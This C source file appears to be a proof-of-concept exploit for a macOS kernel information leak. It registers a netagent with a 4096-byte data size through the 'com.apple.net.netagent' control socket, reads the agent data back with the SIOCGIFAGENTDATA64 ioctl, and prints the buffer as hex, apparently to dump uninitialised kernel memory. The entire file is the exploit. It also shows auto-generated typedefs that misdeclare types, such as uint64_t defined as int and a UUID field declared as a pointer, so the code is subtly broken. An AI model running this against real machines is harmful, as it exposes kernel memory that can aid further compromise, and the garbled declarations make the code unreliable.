
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint64_t ;
struct netagent_req64 {int* netagent_uuid; int netagent_data_size; int netagent_data; int member_0; } ;
struct netagent {int* netagent_uuid; int netagent_data_size; int member_0; } ;
typedef int na ;


 int NETAGENT_OPTION_TYPE_REGISTER ;
 int SIOCGIFAGENTDATA64 ;
 int SYSPROTO_CONTROL ;
 int ctl_open (char*) ;
 int ioctl (int,int ,struct netagent_req64*) ;
 int* malloc (int) ;
 int memset (int*,int ,int) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int setsockopt (int,int ,int ,struct netagent*,int) ;

int main(){
  int fd = ctl_open("com.apple.net.netagent");
  if (fd < 0) {
    printf("failed to get control socket :(\n");
    return 1;
  }
  printf("got a control socket! %d\n", fd);

  struct netagent na = {0};
  na.netagent_uuid[0] = 123;
  na.netagent_data_size = 4096;

  int err = setsockopt(fd,
                       SYSPROTO_CONTROL,
                       NETAGENT_OPTION_TYPE_REGISTER,
                       &na,
                       sizeof(na));
  if (err == -1) {
    perror("setsockopt failed");
    return 0;
  } else {
    printf("set the option!\n");
  }

  uint64_t* buf = malloc(4096);
  memset(buf, 0, 4096);

  struct netagent_req64 req = {0};
  req.netagent_uuid[0] = 123;
  req.netagent_data_size = 4096;
  req.netagent_data = (uint64_t)buf;


  err = ioctl(fd, SIOCGIFAGENTDATA64, &req);
  if (err == -1) {
    perror("get getinterface agent data failed");
  }else {
    printf("got something?\n");
    for (int i = 0; i < 4096/8; i++) {
      printf("%016llx\n", buf[i]);
    }
  }


  return 0;
}
